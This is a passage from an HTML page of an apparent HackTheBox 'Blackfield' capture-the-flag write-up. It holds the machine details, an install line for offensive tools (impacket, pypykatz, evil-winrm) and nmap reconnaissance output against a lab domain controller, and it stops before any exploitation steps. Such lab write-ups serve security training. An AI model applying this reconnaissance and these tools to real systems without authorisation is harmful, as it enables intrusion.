<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Blackfield/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Blackfield | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Blackfield/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Blackfield | CyFun"><meta data-rh="true" name="description" content="- Name: Blackfield"><meta data-rh="true" property="og:description" content="- Name: Blackfield"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Blackfield/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Blackfield/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Blackfield/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Blackfield</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Blackfield </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Blackfield</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/255" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 40</li></ul><p><img loading="lazy" alt="Blackfield" src="/assets/images/blackfield-4d78c63dab996c8933bd5d19b1a5fbff.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p><strong>TL;DR</strong>: </p><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap smbclient impacket python-pypykatz evil-winrm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port &amp; service discovery with <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.026s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65527 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp   open  domain?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNSVersionBindReqTCP:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    bind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp  open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp  open  microsoft-ds?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:(DNSVersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:sion\x04bind\0\0\x10\0\x03&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: 7h06m19s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2020-09-18T03:50:43</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It seems we have here a domain controller with hostname DC01.</p><p>Edit <code>/etc/hosts</code> to add the local domain:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.192 backfield.local</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path 